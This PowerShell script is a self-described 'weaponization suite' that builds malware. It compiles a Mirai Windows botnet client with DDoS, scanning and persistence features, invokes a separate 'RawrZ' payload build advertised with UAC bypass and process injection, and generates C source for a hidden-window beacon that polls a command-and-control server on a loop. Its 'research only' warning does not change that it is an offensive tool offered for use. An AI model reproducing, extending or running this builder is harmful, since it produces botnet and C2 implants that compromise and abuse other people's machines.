# Integrated Build System - Mirai + RawrZ + Beaconism
# Complete weaponization suite with GUI interface

param(
  [Parameter(Mandatory = $false)]
  [string]$PayloadType = "mirai",
    
  [Parameter(Mandatory = $false)]
  [string]$Architecture = "win64",
    
  [Parameter(Mandatory = $false)]
  [string]$BeaconMode = "http",
    
  [Parameter(Mandatory = $false)]
  [string]$C2Server = "http://c2.example.com",
    
  [Parameter(Mandatory = $false)]
  [int]$BeaconInterval = 60,
    
  [Parameter(Mandatory = $false)]
  [switch]$GUI
)

# Configuration
$BuildConfig = @{
  MiraiPath    = ".\mirai"
  RawrZPath    = "D:\rawrZ\rawr"
  CompilerPath = "D:\GlassquillIDE-Portable\compilers"
  OutputDir    = ".\release\weaponized"
    
  # Supported payload types
  PayloadTypes = @{
    "mirai"  = @{
      Name     = "Mirai Windows Bot"
      Source   = "mirai\bot\main_windows.c"
      Compiler = "gcc"
      Features = @("DDoS", "Scanning", "Persistence")
    }
    "rawrz"  = @{
      Name     = "RawrZ Assembly Payload" 
      Source   = "MASM_2035_GUI_Weaponized.asm"
      Compiler = "nasm"
      Features = @("UAC Bypass", "Process Injection", "GUI")
    }
    "beacon" = @{
      Name     = "Custom Beacon"
      Source   = "generated"
      Compiler = "gcc"
      Features = @("C2 Communication", "Stealth", "Modular")
    }
  }
    
  # Beacon configurations
  BeaconTypes  = @{
    "http"  = @{
      Protocol = "HTTP"
      Port     = 80
      Headers  = @("User-Agent: Mozilla/5.0", "Accept: text/html")
    }
    "https" = @{
      Protocol = "HTTPS"
      Port     = 443
      Headers  = @("User-Agent: Mozilla/5.0", "Accept: text/html")
    }
    "dns"   = @{
      Protocol  = "DNS"
      Port      = 53
      QueryType = "TXT"
    }
    "icmp"  = @{
      Protocol   = "ICMP"
      Port       = 0
      PacketType = "Echo Request"
    }
  }
}

function Write-BuildLog {
  param([string]$Message, [string]$Level = "INFO")
    
  $timestamp = Get-Date -Format "HH:mm:ss"
  $color = switch ($Level) {
    "ERROR" { "Red" }
    "SUCCESS" { "Green" }
    "WARNING" { "Yellow" }
    default { "Cyan" }
  }
    
  Write-Host "[$timestamp] $Message" -ForegroundColor $color
}

function Test-BuildEnvironment {
  Write-BuildLog "🔍 Testing build environment..." "INFO"
    
  $errors = @()
    
  # Check compilers
  if (-not (Get-Command "gcc" -ErrorAction SilentlyContinue)) {
    $errors += "GCC compiler not found in PATH"
  }
    
  # Check NASM for assembly
  if (-not (Test-Path "$($BuildConfig.RawrZPath)\nasm.exe")) {
    $errors += "NASM not found at $($BuildConfig.RawrZPath)"
  }
    
  # Check Mirai sources
  if (-not (Test-Path "$($BuildConfig.MiraiPath)\bot\main_windows.c")) {
    $errors += "Mirai Windows sources not found"
  }
    
  if ($errors.Count -eq 0) {
    Write-BuildLog "✅ Build environment ready" "SUCCESS"
    return $true
  }
  else {
    Write-BuildLog "❌ Build environment issues found:" "ERROR"
    $errors | ForEach-Object { Write-BuildLog "   • $_" "ERROR" }
    return $false
  }
}

function Build-MiraiPayload {
  param(
    [string]$Architecture,
    [string]$BeaconMode,
    [string]$C2Server,
    [int]$Interval
  )
    
  Write-BuildLog "🔧 Building Mirai Windows payload..." "INFO"
    
  # Create output directory
  if (-not (Test-Path $BuildConfig.OutputDir)) {
    New-Item -ItemType Directory -Path $BuildConfig.OutputDir -Force | Out-Null
  }
    
  # Generate beacon configuration
  $beaconConfig = Generate-BeaconConfig -Mode $BeaconMode -Server $C2Server -Interval $Interval
    
  # Inject beacon config into main_windows.c
  $mainSource = Get-Content "$($BuildConfig.MiraiPath)\bot\main_windows.c" -Raw
  $modifiedSource = $mainSource -replace "// BEACON_CONFIG_PLACEHOLDER", $beaconConfig
    
  $tempMainFile = "$($BuildConfig.MiraiPath)\bot\main_windows_beacon.c"
  Set-Content -Path $tempMainFile -Value $modifiedSource
    
  # Build command
  $outputFile = "$($BuildConfig.OutputDir)\mirai_beacon_$Architecture.exe"
  $sourceFiles = @(
    "$($BuildConfig.MiraiPath)\bot\main_windows_beacon.c"
    "$($BuildConfig.MiraiPath)\bot\killer_windows.c"
    "$($BuildConfig.MiraiPath)\bot\scanner_windows.c"
    "$($BuildConfig.MiraiPath)\bot\attack_windows.c"
    "$($BuildConfig.MiraiPath)\bot\util.c"
    "$($BuildConfig.MiraiPath)\bot\rand.c"
    "$($BuildConfig.MiraiPath)\bot\table.c"
  )
    
  $compilerFlags = @(
    "-std=c99"
    "-O3"
    "-s" # Strip symbols
    "-DWIN32"
    "-D_WIN32_WINNT=0x0601"
    "-DMIRAI_BEACON"
    "-DBEACON_MODE_$($BeaconMode.ToUpper())"
  )
    
  $libFlags = @(
    "-lws2_32"
    "-lkernel32" 
    "-luser32"
    "-ladvapi32"
    "-lpsapi"
    "-lntdll"
  )
    
  if ($Architecture -eq "win64") {
    $compiler = "x86_64-w64-mingw32-gcc"
    $compilerFlags += "-m64"
  }
  else {
    $compiler = "i686-w64-mingw32-gcc"
    $compilerFlags += "-m32"
  }
    
  # Fallback to regular gcc if cross-compiler not available
  if (-not (Get-Command $compiler -ErrorAction SilentlyContinue)) {
    $compiler = "gcc"
    Write-BuildLog "⚠️ Cross-compiler not found, using system GCC" "WARNING"
  }
    
  $buildArgs = $compilerFlags + $sourceFiles + @("-o", $outputFile) + $libFlags
    
  Write-BuildLog "Building: $compiler $($buildArgs -join ' ')" "INFO"
    
  try {
    & $compiler $buildArgs 2>&1 | Out-String | Write-Host -ForegroundColor Gray
        
    if (Test-Path $outputFile) {
      $size = (Get-Item $outputFile).Length
      Write-BuildLog "✅ Mirai payload built: $outputFile ($([math]::Round($size/1KB, 1)) KB)" "SUCCESS"
            
      # Cleanup temp file
      Remove-Item $tempMainFile -ErrorAction SilentlyContinue
            
      return $outputFile
    }
    else {
      throw "Build output not found"
    }
  }
  catch {
    Write-BuildLog "❌ Mirai build failed: $_" "ERROR"
    return $null
  }
}

function Build-RawrZPayload {
  param(
    [string]$Architecture
  )
    
  Write-BuildLog "🔧 Building RawrZ Assembly payload..." "INFO"
    
  if (-not (Test-Path $BuildConfig.RawrZPath)) {
    Write-BuildLog "❌ RawrZ path not found: $($BuildConfig.RawrZPath)" "ERROR"
    return $null
  }
    
  # Create output directory
  if (-not (Test-Path $BuildConfig.OutputDir)) {
    New-Item -ItemType Directory -Path $BuildConfig.OutputDir -Force | Out-Null
  }
    
  $currentDir = Get-Location
    
  try {
    Set-Location $BuildConfig.RawrZPath
        
    # Run the RawrZ build script
    Write-BuildLog "Executing RawrZ build process..." "INFO"
    & ".\build.bat" 2>&1 | Out-String | Write-Host -ForegroundColor Gray
        
    # Copy output to our directory
    $rawrzOutput = "MASM2035_Weaponized.exe"
    if (Test-Path $rawrzOutput) {
      $finalOutput = "$($BuildConfig.OutputDir)\rawrz_weaponized_$Architecture.exe"
      Copy-Item $rawrzOutput $finalOutput -Force
            
      $size = (Get-Item $finalOutput).Length
      Write-BuildLog "✅ RawrZ payload built: $finalOutput ($([math]::Round($size/1KB, 1)) KB)" "SUCCESS"
      return $finalOutput
    }
    else {
      Write-BuildLog "❌ RawrZ build output not found" "ERROR"
      return $null
    }
        
  }
  catch {
    Write-BuildLog "❌ RawrZ build failed: $_" "ERROR"
    return $null
  }
  finally {
    Set-Location $currentDir
  }
}

function Generate-BeaconConfig {
  param(
    [string]$Mode,
    [string]$Server,
    [int]$Interval
  )
    
  $config = $BuildConfig.BeaconTypes[$Mode]
    
  return @"
// Auto-generated beacon configuration
#define BEACON_MODE "$Mode"
#define C2_SERVER "$Server"
#define BEACON_INTERVAL $Interval
#define BEACON_PROTOCOL "$($config.Protocol)"
#define BEACON_PORT $($config.Port)

// Beacon implementation
void beacon_init() {
    // Initialize $($config.Protocol) beacon
    // Server: $Server
    // Interval: $Interval seconds
}

void beacon_checkin() {
    // Perform beacon check-in
    // Mode: $Mode
}
"@
}

function Build-CustomBeacon {
  param(
    [string]$BeaconMode,
    [string]$C2Server,
    [int]$Interval,
    [string]$Architecture
  )
    
  Write-BuildLog "🔧 Building custom beacon payload..." "INFO"
    
  # Generate complete beacon source
  $beaconSource = @"
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

$(Generate-BeaconConfig -Mode $BeaconMode -Server $C2Server -Interval $Interval)

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
    
    beacon_init();
    
    while (1) {
        beacon_checkin();
        Sleep(BEACON_INTERVAL * 1000);
    }
    
    return 0;
}

void beacon_init() {
    // Initialize beacon based on mode: $BeaconMode
}

void beacon_checkin() {
    // Beacon implementation for: $BeaconMode
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrl(hInternet, "$C2Server/beacon", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[1024];
            DWORD bytesRead;
            InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead);
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}
"@
    
  $tempBeaconFile = "$($BuildConfig.OutputDir)\beacon_temp.c"
  Set-Content -Path $tempBeaconFile -Value $beaconSource
    
  $outputFile = "$($BuildConfig.OutputDir)\beacon_$BeaconMode_$Architecture.exe"
    
  $compiler = if ($Architecture -eq "win64") { "x86_64-w64-mingw32-gcc" } else { "i686-w64-mingw32-gcc" }
  if (-not (Get-Command $compiler -ErrorAction SilentlyContinue)) {
    $compiler = "gcc"
  }
    
  $buildArgs = @(
    "-std=c99"
    "-O2"
    "-s"
    "-DWIN32"
    "-mwindows" # No console window
    $tempBeaconFile
    "-o"
    $outputFile
    "-lwininet"
    "-lkernel32"
    "-luser32"
  )
    
  try {
    & $compiler $buildArgs 2>&1 | Out-String | Write-Host -ForegroundColor Gray
        
    if (Test-Path $outputFile) {
      $size = (Get-Item $outputFile).Length
      Write-BuildLog "✅ Custom beacon built: $outputFile ($([math]::Round($size/1KB, 1)) KB)" "SUCCESS"
            
      # Cleanup
      Remove-Item $tempBeaconFile -ErrorAction SilentlyContinue
            
      return $outputFile
    }
    else {
      throw "Build output not found"
    }
  }
  catch {
    Write-BuildLog "❌ Beacon build failed: $_" "ERROR"
    return $null
  }
}

function Show-PayloadSummary {
  param([array]$BuiltPayloads)
    
  Write-Host "`n" + "="*60 -ForegroundColor Cyan
  Write-Host "🎉 BUILD SUMMARY" -ForegroundColor Green
  Write-Host "="*60 -ForegroundColor Cyan
    
  if ($BuiltPayloads.Count -eq 0) {
    Write-Host "❌ No payloads were built successfully" -ForegroundColor Red
    return
  }
    
  $BuiltPayloads | ForEach-Object {
    if ($_) {
      $file = Get-Item $_
      Write-Host "✅ $($file.Name)" -ForegroundColor Green
      Write-Host "   Size: $([math]::Round($file.Length/1KB, 1)) KB" -ForegroundColor Gray
      Write-Host "   Path: $($file.FullName)" -ForegroundColor Gray
      Write-Host ""
    }
  }
    
  Write-Host "📂 Output directory: $($BuildConfig.OutputDir)" -ForegroundColor Cyan
  Write-Host "⚠️  Remember: These are functional weapons for research only!" -ForegroundColor Yellow
  Write-Host "="*60 -ForegroundColor Cyan
}

# Main execution
Write-Host @"
🔥 INTEGRATED WEAPONIZATION SUITE
==================================
Mirai + RawrZ + Beaconism Integration
Payload Builder & Deployment System

⚠️  WARNING: Creates functional malware!
   Use only for authorized security research!

"@ -ForegroundColor Red

if (-not (Test-BuildEnvironment)) {
  Write-BuildLog "❌ Build environment not ready. Please fix issues and try again." "ERROR"
  exit 1
}

Write-BuildLog "🚀 Starting integrated build process..." "INFO"
Write-BuildLog "Payload Type: $PayloadType" "INFO"
Write-BuildLog "Architecture: $Architecture" "INFO"
Write-BuildLog "Beacon Mode: $BeaconMode" "INFO"
Write-BuildLog "C2 Server: $C2Server" "INFO"

$builtPayloads = @()

switch ($PayloadType) {
  "mirai" {
    $payload = Build-MiraiPayload -Architecture $Architecture -BeaconMode $BeaconMode -C2Server $C2Server -Interval $BeaconInterval
    if ($payload) { $builtPayloads += $payload }
  }
    
  "rawrz" {
    $payload = Build-RawrZPayload -Architecture $Architecture
    if ($payload) { $builtPayloads += $payload }
  }
    
  "beacon" {
    $payload = Build-CustomBeacon -BeaconMode $BeaconMode -C2Server $C2Server -Interval $BeaconInterval -Architecture $Architecture
    if ($payload) { $builtPayloads += $payload }
  }
    
  "all" {
    Write-BuildLog "🔥 Building ALL payload types..." "INFO"
        
    $miraiPayload = Build-MiraiPayload -Architecture $Architecture -BeaconMode $BeaconMode -C2Server $C2Server -Interval $BeaconInterval
    if ($miraiPayload) { $builtPayloads += $miraiPayload }
        
    $rawrzPayload = Build-RawrZPayload -Architecture $Architecture  
    if ($rawrzPayload) { $builtPayloads += $rawrzPayload }
        
    $beaconPayload = Build-CustomBeacon -BeaconMode $BeaconMode -C2Server $C2Server -Interval $BeaconInterval -Architecture $Architecture
    if ($beaconPayload) { $builtPayloads += $beaconPayload }
  }
    
  default {
    Write-BuildLog "❌ Unknown payload type: $PayloadType" "ERROR"
    Write-BuildLog "Available types: mirai, rawrz, beacon, all" "INFO"
    exit 1
  }
}

Show-PayloadSummary -BuiltPayloads $builtPayloads

Write-BuildLog "🎯 Integrated build process completed!" "SUCCESS"